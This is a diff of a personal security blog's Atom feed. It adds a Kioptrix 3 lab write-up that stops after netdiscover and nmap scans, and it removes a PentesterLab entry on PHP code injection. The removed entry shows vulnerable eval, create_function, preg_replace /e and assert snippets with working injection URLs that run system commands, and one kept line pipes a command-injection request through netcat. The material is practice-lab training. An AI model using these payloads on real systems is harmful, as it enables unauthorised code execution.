@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-09T11:17:02-05:00</updated>
+  <updated>2016-06-09T13:25:49-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,42 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kiotrix3]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
+    <updated>2016-06-09T11:42:38-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>zap</li>
+<li>netcat</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.184 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Ports 22 and 80 are opening</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[vulhub-Kioptrix Level 2]]></title>
@@ -2749,123 +2785,6 @@ In Debian Linux, the tomcat configuration file tomcat-users.xml has default loca
 
 <p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26ls HTTP/1.1\r\nHost: 192.168.79.162\r\nConnection: close\r\n" | nc 192.168.79.162 80
 </code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Code Injection]]></title>
-    <link href="http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection/"/>
-    <updated>2016-03-18T14:37:22-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection</id>
-    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
-
-<p>Difficluty: 1/5</p>
-
-<!--more-->
-
-
-<p>Pentester lab:
- Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command ls, you will need to send system(&ldquo;ls&rdquo;) to the application since it is a PHP application.</p>
-
-<h3>Example 1</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="nv">$str</span><span class="o">=</span><span class="s2">&quot;echo </span><span class="se">\&quot;</span><span class="s2">Hello &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;!!!</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p> The developer use function <code>eval</code> to echo the name. Hpwever, the developer doesn&rsquo;t filter the input of eval function. By using concatenation <code>.</code>, I can add code after the input and use <code>#</code> to comment the rest of code</p>
-
-<p> manually exploit:</p>
-
-<p> <code>http://192.168.79.162/codeexec/example1.php?name=hacker".system('uname -a');#</code></p>
-
-<p> payload <code>hacker".system('uname -a');#</code> needs to be URL encoded.</p>
-
-<h3>Example 2</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$order</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">];</span>
-</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>      <span class="nv">$users</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$order</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>      <span class="nb">usort</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;$a, $b&#39;</span><span class="p">,</span> <span class="s1">&#39;return strcmp($a-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;,$b-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">));</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>  <span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Form Pentesterlab:</p>
-
-<p>The function usort is often used with the function create_function to dynamically generate the &ldquo;sorting&rdquo; function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>
-
-<p>manually exploit:</p>
-
-<p><code>http://192.168.79.162/codeexec/example2.php?order=id);}system('uname -a');#</code></p>
-
-<h3>Example 3</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="k">echo</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;pattern&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;new&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;base&quot;</span><span class="p">]);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From Pentesterlab:</p>
-
-<p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.</p>
-
-<p>manually exploit:</p>
-
-<p><code>http://192.168.79.162/codeexec/example3.php?new=system('uname%20-a')&amp;pattern=/lamer/e&amp;base=Hello lamer</code></p>
-
-<h3>Example 4</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example4.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">assert</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">));</span>
-</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Hello &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>from Pentesterlab:</p>
-
-<p>This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.</p>
-
-<p>manual exploit:</p>
-
-<p><code>http://192.168.79.162/codeexec/example4.php?name=hacker'.system('uname -a').'</code></p>
 ]]></content>
   </entry>
   
